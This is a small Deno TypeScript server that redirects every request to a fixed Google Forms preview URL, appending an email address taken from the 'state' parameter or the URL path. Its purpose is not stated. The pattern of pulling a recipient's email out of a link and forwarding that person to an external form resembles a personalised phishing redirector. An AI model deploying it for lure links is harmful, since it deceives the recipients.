const PORT = Number(Deno.env.get("PORT") || 8080);

Deno.serve({ port: PORT }, async (req) => {
  const url = new URL(req.url);

  const redirectBase =
    "https://docs.google.com/forms/d/1qQorTQgTj_dvc5hHddk0wA2qWx4LFj1eRiGRl98SUZE/preview";

  let email: string | null = null;

  const state = url.searchParams.get("state");
  if (state) {
    try {
      const decoded = decodeURIComponent(state);
      if (decoded.includes("@") && !decoded.includes("/")) {
        email = decoded;
      }
    } catch {
      email = null;
    }
  }

  if (!email) {
    const path = url.pathname.replace(/\/+$/, "").split("/").at(-1);
    if (path && path.includes("@") && !path.includes("/")) {
      try {
        email = decodeURIComponent(path);
      } catch {
        email = null;
      }
    }
  }

  const redirectUrl = email
    ? redirectBase.replace(/\/+$/, "") + "/" + email
    : redirectBase;

  return Response.redirect(redirectUrl, 302);
});
